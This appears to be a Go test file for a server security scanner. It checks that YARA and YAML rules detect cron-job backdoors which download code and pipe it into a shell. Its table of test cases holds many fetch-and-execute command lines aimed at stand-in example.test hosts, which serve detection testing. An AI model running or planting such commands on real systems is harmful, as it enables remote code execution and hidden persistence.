//go:build yara

package yara_test

import (
	"path/filepath"
	"runtime"
	"testing"

	"github.com/pidginhost/csm/internal/signatures"
	csmyara "github.com/pidginhost/csm/internal/yara"
)

func TestCronDownloaderCommandBoundaries(t *testing.T) {
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")
	yaraScanner, err := csmyara.NewScanner(configsDir)
	if err != nil {
		t.Fatalf("loading YARA rules: %v", err)
	}
	yamlScanner := signatures.NewScanner(configsDir)
	if err := yamlScanner.LoadError(); err != nil {
		t.Fatalf("loading YAML rules: %v", err)
	}

	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"sudo user named sh without command", "curl https://example.test/a | sudo -u sh", false},
		{"unset variable named sh without command", "curl https://example.test/a | env -u sh", false},
		{"long unset option without command", "curl https://example.test/a | env --unset sh", false},
		{"attached unset option", "curl https://payload.example.test/a | env --unset=sh /bin/bash", true},
		{"escaped env assignment without command", "curl https://example.test/a | env NOTE=word\\ sh", false},
		{"escaped env assignment", "curl https://payload.example.test/a | env NOTE=word\\ sh /bin/bash", true},
		{"sudo user option", "curl https://payload.example.test/a | sudo -u root /bin/bash", true},
		{"quoted env assignment", "curl https://payload.example.test/a | env NOTE='word sh' /bin/bash", true},
		{"env assignment without command", "curl https://example.test/a | env NOTE='word sh'", false},
		{"double quoted env assignment without command", "curl https://example.test/a | env NOTE=\"word sh\"", false},
		{"env assignment", "curl https://payload.example.test/a | env PATH=/usr/bin:/bin bash", true},
		{"nested wrappers", "curl https://payload.example.test/a | /usr/bin/sudo -n env PATH=/usr/bin:/bin /bin/sh", true},
		{"sudo option", "curl https://payload.example.test/a | sudo -n /bin/bash", true},
		{"resolved shell", "curl https://payload.example.test/a | $(which bash)", true},
		{"resolved absolute shell", "curl https://payload.example.test/a | $(command -v /bin/sh)", true},
		{"env wrapper", "curl https://payload.example.test/a | env bash", true},
		{"quoted shell", "curl https://payload.example.test/a | \"bash\"", true},
		{"quoted absolute shell", "curl https://payload.example.test/a | '/bin/sh'", true},
		{"subshell", "wget -O /tmp/a https://payload.example.test/a; (bash /tmp/a)", true},
		{"brace group", "wget -O /tmp/a https://payload.example.test/a && { sh /tmp/a; }", true},
		{"shell input redirection", "wget -O /tmp/a https://payload.example.test/a; sh</tmp/a", true},
		{"shell name in script", "curl https://example.test/a; sh.php", false},
		{"shell name in tool", "curl https://example.test/a | sh-check", false},
		{"quoted tool name", "curl https://example.test/a | \"sh\"-check", false},
		{"quoted script name", "curl https://example.test/a; 'sh'.php", false},
		{"resolved tool name", "curl https://example.test/a | $(which sh)-check", false},
		{"shell name in path", "curl https://example.test/a; /bin/sh/assets", false},
		{"assignment", "curl https://example.test/a; exec=value", false},
		{"URL parameter", "curl \"https://example.test/task;eval=1\"", false},
		{"separate line", "curl https://example.test/a |\nbash documentation", false},
		{"separate line after sudo", "curl https://example.test/a | sudo\nsh documentation", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			content := []byte("*/5 * * * * " + tc.command)
			matches, err := yaraScanner.ScanBytesChecked(content)
			if err != nil {
				t.Fatalf("YARA scan failed: %v", err)
			}
			if got := hasRepositoryYaraRule(matches, "backdoor_cron_downloader"); got != tc.want {
				t.Errorf("YARA matched = %t, want %t", got, tc.want)
			}
			if got := hasSignatureRule(yamlScanner.ScanContent(content, ".cron"), "backdoor_cron_reverse_shell"); got != tc.want {
				t.Errorf("YAML matched = %t, want %t", got, tc.want)
			}
		})
	}
}
